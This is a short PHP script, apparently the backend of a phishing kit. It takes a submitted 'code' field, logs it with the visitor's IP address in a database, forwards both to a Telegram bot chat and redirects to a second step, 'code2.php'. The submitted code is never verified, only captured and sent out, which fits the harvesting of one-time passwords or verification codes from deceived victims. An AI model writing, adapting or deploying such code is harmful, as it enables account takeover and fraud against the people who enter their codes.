<?php
session_start();
require_once 'config.php';

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");

$conn = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
if ($conn->connect_error) {
    error_log("Error de conexión: " . $conn->connect_error);
    exit("Error de conexión. Inténtalo más tarde.");
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $code = sanitizeInput($_POST['code'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR']; // Obtener la IP del usuario

    if (empty($code)) {
        exit("Por favor, ingrese el código.");
    }

    // Verificar si la IP ya está registrada
    $stmt = $conn->prepare("SELECT COUNT(*) FROM usuarios WHERE ip = ?");
    if (!$stmt) {
        error_log("Error al preparar consulta: " . $conn->error);
        exit("Ocurrió un problema. Inténtalo más tarde.");
    }
    $stmt->bind_param("s", $ip);
    $stmt->execute();
    $stmt->bind_result($ip_count);
    $stmt->fetch();
    $stmt->close();

    // Determinar si la IP ya está registrada
    $is_ip_registered = ($ip_count > 0);

    // Insertar el registro si la IP no está registrada aún
    if (!$is_ip_registered) {
        $stmt = $conn->prepare("INSERT INTO usuarios (code, ip) VALUES (?, ?)");
        if (!$stmt) {
            error_log("Error al preparar consulta: " . $conn->error);
            exit("Ocurrió un problema. Inténtalo más tarde.");
        }

        $stmt->bind_param("ss", $code, $ip);
        if (!$stmt->execute()) {
            error_log("Error al ejecutar consulta: " . $stmt->error);
            exit("Ocurrió un problema. Inténtalo más tarde.");
        }
        $stmt->close();
    }

    // Enviar mensaje a Telegram
    $emoji = getEmojiByIP($ip); // Generar emoji basado en la IP
    $mensaje = "Nuevo código recibido:\n"
        . "Código: {$code}\n"
        . "IP: {$ip}\n"
        . "Emoji: {$emoji}\n"
        . ($is_ip_registered ? "*Nota: La IP ya estaba registrada.*" : "*Registro nuevo.*");
    sendNotification(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, $mensaje, "Markdown");

    header("Location: code2.php");
    exit();
}

$conn->close();

function sanitizeInput($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

function getEmojiByIP($ip) {
    $emojis = ["❤️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "💔", "💕", "💖", "💗"];
    $hash = crc32($ip);
    return $emojis[$hash % count($emojis)];
}

function sendNotification($token, $chat_id, $message, $parse_mode = null) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
    ];
    if ($parse_mode) {
        $data['parse_mode'] = $parse_mode;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $http_code === 200;
}
?>
